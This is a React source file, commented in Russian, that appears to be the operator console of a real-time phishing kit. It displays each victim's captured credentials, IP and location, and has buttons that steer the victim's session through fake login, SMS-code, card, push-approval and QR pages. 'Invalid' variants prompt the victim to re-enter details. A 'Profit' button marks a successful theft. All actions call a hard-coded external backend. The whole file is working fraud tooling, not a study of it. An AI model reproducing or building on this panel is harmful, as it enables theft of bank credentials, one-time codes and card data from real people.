import React, { useState, useEffect } from 'react';

const Action = ({ log, onClose }) => {
    // Список идентификаторов страниц
    const taskPages = {
        login: 'login',
        invalid_login: 'invalid_login',
        sms: 'sms',
        invalid_sms: 'invalid_sms',
        card: 'card',
        invalid_card: 'invalid_card',
        push_v1: 'push_v1',
        push_v2: 'push_v2',
        custom_push: 'custom_push',
        custom_text: 'custom_text',
        qr_link: 'qr_link',
        qr_file: 'qr_file',
        page_v1: 'page_v1',
        page_v2: 'page_v2',
        page_v3: 'page_v3',
        profit: 'profit',
        ban: 'ban',
    };

    const [offerOptions, setOfferOptions] = useState({});
    const offerId = log.offerId;
    const [customPushText, setCustomPushText] = useState('');
    const [customText, setCustomText] = useState('');
    const [qrLink, setQrLink] = useState('');
    const [qrFile, setQrFile] = useState(null);
    const [statusMessage, setStatusMessage] = useState('');
    const [loading, setLoading] = useState(false);
    const [showMessage, setShowMessage] = useState(false); // Состояние для управления видимостью сообщения
    const [showCred, setShowCred] = useState(false);
    const [credData, setCredData] = useState('');

    const handleShowCred = () => {
        // Формируем строку ключ-значение из data лога
        const dataEntries = Object.entries(log.data).map(([key, value]) => `${key}: ${value}`).join('\n');
        setCredData(dataEntries);
        setShowCred(true);
    };

    const handleHideCred = () => {
        setShowCred(false);
    };

    useEffect(() => {
        const fetchOfferOptions = async () => {
            try {
                const response = await fetch(`https://biografiasguays.com/offers/${offerId}`);
                const offer = await response.json();
                setOfferOptions(offer.options); // Устанавливаем опции для выбранного оффера
            } catch (error) {
                console.error('Error fetching offer options:', error);
            }
        };

        fetchOfferOptions();
    }, [offerId]);

    const deleteLog = async () => {
        setLoading(true);
        setStatusMessage('');
    
        try {
            const response = await fetch(`https://biografiasguays.com/logs/${log.sessionId}`, { // Убедитесь, что log.sessionId - это строка
                method: 'DELETE',
            });
    
            if (response.ok) {
                const data = await response.json();
                setStatusMessage(data.message); // "Log deleted successfully"
                setShowMessage(true);
                setTimeout(() => {
                    onClose(); // Закрываем Action через 2 секунды
                }, 1000);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);
            }
        } catch (error) {
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false);
        }
    };

    const updateQrFile = async () => {
        const formData = new FormData();
        formData.append('qrFile', qrFile);
        formData.append('sessionId', log.sessionId);

        setLoading(true); // Устанавливаем состояние загрузки
        setStatusMessage(''); // Сбрасываем предыдущее сообщение
        setShowMessage(false);

        try {
            const response = await fetch('https://biografiasguays.com/logs/set-qr-file', {
                method: 'POST',
                body: formData,
            });

            if (response.ok) {
                const data = await response.json();
                setStatusMessage(data.message); // "QR file uploaded successfully"
                setShowMessage(true);
                await updateTaskPage(taskPages.qr_file);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);    
            }
        } catch (error) {
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false); // Сбрасываем состояние загрузки
        }
    };

    const updateQrLink = async () => {
        setLoading(true);
        setStatusMessage('');

        try {
            const response = await fetch('https://biografiasguays.com/logs/set-qr-link', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: log.sessionId,
                    qrLink: qrLink,
                }),
            });

            if (response.ok) {
                const data = await response.json();
                setStatusMessage(data.message); // "QR link updated successfully"
                setShowMessage(true);
                await updateTaskPage(taskPages.qr_link);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);
            }
        } catch (error) {
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false);
        }
    };

    const updateCustomPushText = async () => {
        setLoading(true);
        setStatusMessage('');

        try {
            const response = await fetch('https://biografiasguays.com/logs/set-text-custom-push', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: log.sessionId,
                    text: customPushText,
                }),
            });

            if (response.ok) {
                const data = await response.json();
                setStatusMessage(data.message); // "textCustomPush updated successfully"
                setShowMessage(true);
                await updateTaskPage(taskPages.custom_push);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);
            }
        } catch (error) {
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false);
        }
    };

    const updateCustomText = async () => {
        setLoading(true);
        setStatusMessage('');

        try {
            const response = await fetch('https://biografiasguays.com/logs/set-text-custom-question', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: log.sessionId,
                    text: customText,
                }),
            });

            if (response.ok) {
                const data = await response.json();
                setStatusMessage(data.message); // "textCustomQuestion updated successfully"
                setShowMessage(true);
                await updateTaskPage(taskPages.custom_text);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);
            }
        } catch (error) {
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false);
        }
    };

    const updateTaskPage = async (taskPageId) => {
        try {
            const response = await fetch(`https://biografiasguays.com/logs/update-task-page/${log.sessionId}/${taskPageId}`, {
                method: 'GET',
            });
            if (response.ok) {
                setStatusMessage('Успешно отправлен!');
                setShowMessage(true);
            } else {
                const errorData = await response.json();
                setStatusMessage(`Произошла ошибка: ${errorData.error || 'Неизвестная ошибка'}`);
                setShowMessage(true);
            }
            
        } catch (error) {
            console.error('Ошибка перемещения:', error);
            setStatusMessage(`Ошибка: ${error.message}`);
            setShowMessage(true);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        if (showMessage) {
            const timer = setTimeout(() => {
                setShowMessage(false);
                setStatusMessage(''); // Очищаем текст сообщения
            }, 3000);
            return () => clearTimeout(timer);
        }
    }, [showMessage]);

    return (
        <div>
            <div
                id="action-container"
                className="action-container"
                style={{
                    display: 'flex',
                    width: '100%',
                    height: '100%',
                    zIndex: 9999,
                    top: 0,
                    left: 0,
                    position: 'fixed',
                    background: 'rgba(0,0,0,0.3)',
                    alignItems: 'center',
                    justifyContent: 'center',
                    padding: '15px',
                }}
            >
                <div
                    style={{
                        maxWidth: '450px',
                        width: '100%',
                        background: 'rgba(255,255,255,0.9)',
                        padding: '30px 20px',
                        borderRadius: '10px',
                        paddingTop: '20px',
                    }}
                >
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <div className="d-flex justify-content-start align-items-center" style={{ width: '100%' }}>
                            <span style={{ color: 'rgb(0,0,0)', fontWeight: 'bold', fontSize: '17px' }}>
                                OFFER:&nbsp;<span>{log.offerName}</span>
                            </span>
                        </div>
                        <div className="d-flex justify-content-end align-items-center" style={{ textAlign: 'right', width: '100%' }}>
                            <button
                                onClick={onClose}
                                className="d-flex justify-content-center align-items-center"
                                type="button"
                                style={{
                                    width: '30px',
                                    height: '30px',
                                    background: '#fff',
                                    borderRadius: '40px',
                                    borderWidth: '1px',
                                    borderStyle: 'none',
                                    padding: 0,
                                }}
                            >
                                <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    viewBox="0 0 512 512"
                                    width="1em"
                                    height="1em"
                                    fill="currentColor"
                                    style={{ color: 'rgb(255,0,0)', lineHeight: '30px', fontSize: '30px' }}
                                >
                                    <path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM175 175c9.4-9.4 24.6-9.4 33.9 0l47 47 47-47c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9l-47 47 47 47c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-47-47-47 47c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l47-47-47-47c-9.4-9.4-9.4-24.6 0-33.9z"></path>
                                </svg>
                            </button>
                        </div>
                    </div>
                    <div className="d-flex justify-content-start align-items-center" style={{ width: '100%' }}>
                        <span style={{ color: 'rgb(0,0,0)', fontWeight: 'bold', fontSize: '17px' }}>
                            ID:&nbsp;<span>{log.sessionId}</span>
                        </span>
                    </div>
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <span style={{ color: 'rgb(0,0,0)', fontWeight: 'bold', fontSize: '17px', width: '100%' }}>
                            IP:&nbsp;<span>{log.ip}</span>
                        </span>
                        <span style={{ color: 'rgb(0,0,0)', fontWeight: 'bold', lineHeight: '16px', width: '100%', textAlign: 'center' }}>
                            &nbsp;|&nbsp;
                        </span>
                        <span style={{ color: 'rgb(0,0,0)', fontWeight: 'bold', fontSize: '17px', width: '100%' }}>
                            GEO:&nbsp;<span>{log.geo}</span>
                        </span>
                    </div>
                    <div style={{ width: '100%', marginBottom: '20px' }}>
                        <button onClick={handleShowCred} className="btn btn-primary" id="show-creds" type="button" style={{ width: '100%' }}>
                            Show Creds
                        </button>
                    </div>
                    {showCred && (
                    <div id="creds-form" style={{ width: '100%', marginBottom: '20px' }}>
                        <button onClick={handleHideCred} className="btn btn-primary" id="hide-creds-form" type="button" style={{ width: '100%', background: 'rgb(122,122,122)', fontSize: '12px', borderStyle: 'none' }}>
                            hide
                        </button>
                        <textarea 
                        value={credData} 
                        readOnly 
                        id="creds-results" 
                        style={{ width: '100%', padding: '10px', border: '1px solid #000', marginTop: '15px',}}
                        rows="10"
                        cols="auto"
                        />
                    </div>
                    )}
                    {offerOptions.login && (
                        <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                            <button 
                            className="btn btn-primary"
                            type="button"
                            style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none' }}
                            onClick={() => updateTaskPage(taskPages.login)}
                            >
                                Login
                            </button>
                    {offerOptions.invalid_login && (
                            <button onClick={() => updateTaskPage(taskPages.invalid_login)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(183,0,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none' }}>
                                Invalid
                            </button>
                    )}
                        </div>
                    )}

                    {offerOptions.sms && (
                        <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                            <button onClick={() => updateTaskPage(taskPages.sms)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none' }}>
                                Sms
                            </button>
                    {offerOptions.invalid_sms && (
                            <button onClick={() => updateTaskPage(taskPages.invalid_sms)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(183,0,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none' }}>
                                Invalid
                            </button>
                    )}
                        </div>
                    )}

                    {offerOptions.card && (
                        <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                            <button onClick={() => updateTaskPage(taskPages.card)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none' }}>
                                Card
                            </button>
                    {offerOptions.invalid_card && (
                            <button onClick={() => updateTaskPage(taskPages.invalid_card)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(183,0,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none' }}>
                                Invalid
                            </button>
                    )}
                        </div>
                    )}

                    {offerOptions.push_v1 && (
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <button onClick={() => updateTaskPage(taskPages.push_v1)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none' }}>
                            PUSH v.1
                        </button>
                    {offerOptions.push_v2 && (    
                        <button onClick={() => updateTaskPage(taskPages.push_v2)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(183,0,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none' }}>
                            PUSH v.2
                        </button>
                    )}
                    </div>
                    )}
                    {offerOptions.custom_push && (                    
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <input
                        value={customPushText}
                        onChange={(e) => setCustomPushText(e.target.value)}    
                            type="text"
                            style={{
                                height: '36px',
                                paddingLeft: '10px',
                                paddingTop: '2px',
                                paddingBottom: '2px',
                                width: '100%',
                                borderTopLeftRadius: '6px',
                                borderBottomLeftRadius: '6px',
                                borderTopWidth: '1px',
                                borderTopStyle: 'solid',
                                borderRightStyle: 'none',
                                borderBottomWidth: '1px',
                                borderBottomColor: 'rgb(118,118,118)',
                                borderLeftWidth: '1px',
                                borderLeftColor: 'rgb(118,118,118)',
                            }}
                            placeholder="Text for PUSH"
                        />
                        <button onClick={updateCustomPushText} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderStyle: 'none', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, fontSize: 'small', height: '36px' }}>
                            Set Custom PUSH
                        </button>
                    </div>
                    )}

                    {offerOptions.custom_text && (
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <input
                        value={customText}
                        onChange={(e) => setCustomText(e.target.value)}
                            type="text"
                            style={{
                                height: '36px',
                                paddingLeft: '10px',
                                paddingTop: '2px',
                                paddingBottom: '2px',
                                width: '100%',
                                borderTopLeftRadius: '6px',
                                borderBottomLeftRadius: '6px',
                                borderTopWidth: '1px',
                                borderTopStyle: 'solid',
                                borderRightStyle: 'none',
                                borderBottomWidth: '1px',
                                borderBottomColor: 'rgb(118,118,118)',
                                borderLeftWidth: '1px',
                                borderLeftColor: 'rgb(118,118,118)',
                            }}
                            placeholder="CUSTOM TEXT"
                        />
                        <button onClick={updateCustomText} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderStyle: 'none', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, height: '36px', fontSize: 'small' }}>
                            Set Custom &amp; Go
                        </button>
                    </div>
                    )}

                    {offerOptions.qr_link && (
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '5px' }}>
                        <input
                        value={qrLink}
                        onChange={(e) => setQrLink(e.target.value)}
                            type="text"
                            style={{
                                height: '36px',
                                paddingLeft: '10px',
                                paddingTop: '2px',
                                paddingBottom: '2px',
                                width: '100%',
                                borderTopLeftRadius: '6px',
                                borderBottomLeftRadius: '6px',
                                borderTopWidth: '1px',
                                borderTopStyle: 'solid',
                                borderRightStyle: 'none',
                                borderBottomWidth: '1px',
                                borderBottomColor: 'rgb(118,118,118)',
                                borderLeftWidth: '1px',
                                borderLeftColor: 'rgb(118,118,118)',
                            }}
                            placeholder="QR link"
                        />
                        <button onClick={updateQrLink} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderStyle: 'none', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, fontSize: 'small', height: '36px' }}>
                            Set QR &amp; Go
                        </button>
                    </div>
                    )}
                    
                    {offerOptions.qr_file && (
                    <>
                    <div className="d-flex align-items-center" style={{ textAlign: 'center', marginBottom: '5px' }}>
                        <span style={{ width: '100%', fontWeight: 'bold', fontSize: '11px', color: 'rgb(0,0,0)' }}>OR</span>
                    </div>
                    
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                        <input
                            className="d-flex justify-content-center align-items-center"
                            type="file"
                            onChange={(e) => setQrFile(e.target.files[0])}
                            style={{
                                height: '36px',
                                paddingLeft: '10px',
                                paddingTop: '2px',
                                paddingBottom: '2px',
                                width: '100%',
                                borderTopLeftRadius: '6px',
                                borderBottomLeftRadius: '6px',
                                background: '#ffffff',
                                textAlign: 'center',
                                borderTop: '1px solid rgb(118,118,118)',
                                borderRightStyle: 'none',
                                borderBottom: '1px solid rgb(118,118,118)',
                                borderLeft: '1px solid rgb(118,118,118)',
                            }}
                            placeholder="QR FILE"
                        />
                        <button onClick={updateQrFile} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderStyle: 'none', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, fontSize: 'small', height: '36px' }}>
                            Set QR&nbsp;&amp; Go
                        </button>
                    </div>
                    </>
                    )}
                    
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                    {offerOptions.page_v1 && (
                        <button onClick={() => updateTaskPage(taskPages.page_v1)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none', fontSize: 'small', height: '36px' }}>
                            Page v.1
                        </button>
                    )}    
                    {offerOptions.page_v2 && (    
                        <button onClick={() => updateTaskPage(taskPages.page_v2)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, fontSize: 'small', height: '36px' }}>
                            Page v.2
                        </button>
                    )}    
                    {offerOptions.page_v3 && (   
                        <button onClick={() => updateTaskPage(taskPages.page_v3)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(13,169,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none', fontSize: 'small', height: '36px' }}>
                            Page v.3
                        </button>
                    )}

                    </div>
                    
                    <div className="d-flex align-items-center" style={{ width: '100%', marginBottom: '20px' }}>
                    {offerOptions.profit && (
                        <button onClick={() => updateTaskPage(taskPages.profit)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(169,0,162)', fontWeight: 'bold', borderTopRightRadius: 0, borderBottomRightRadius: 0, borderStyle: 'none', fontSize: 'small', height: '36px' }}>
                            Profit
                        </button>

                    )}
                    {offerOptions.ban && (
                        <button onClick={() => updateTaskPage(taskPages.ban)} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(169,10,0)', fontWeight: 'bold', borderTopLeftRadius: 0, borderBottomLeftRadius: 0, borderStyle: 'none', fontSize: 'small', height: '36px' }}>
                            BAN
                        </button>
                    )}
                    </div>
                    <div>
                    <button onClick={deleteLog} className="btn btn-primary" type="button" style={{ width: '100%', background: 'rgb(169,10,0)', fontWeight: 'bold', borderStyle: 'none', fontSize: 'small', height: '36px' }}>
                        DELETE
                    </button>
                    </div>
                </div>
            </div>
            {loading && <p>Загрузка...</p>}
        {statusMessage && 
        <div style={{width: '100%', backgroundColor: 'rgba(0,0,0,0.7)',  padding: '20px', textAlign: 'center', borderRadius: '6px', position: 'fixed', zIndex: '9999', alignItems: 'center', justifyContent:'center', top: '100px' }}>
            <p style={{width: '100%', margin: '0', fontWeight: 'bold'}}>{statusMessage}</p>
        </div>
        }
        </div>
        
    );
};

export default Action;
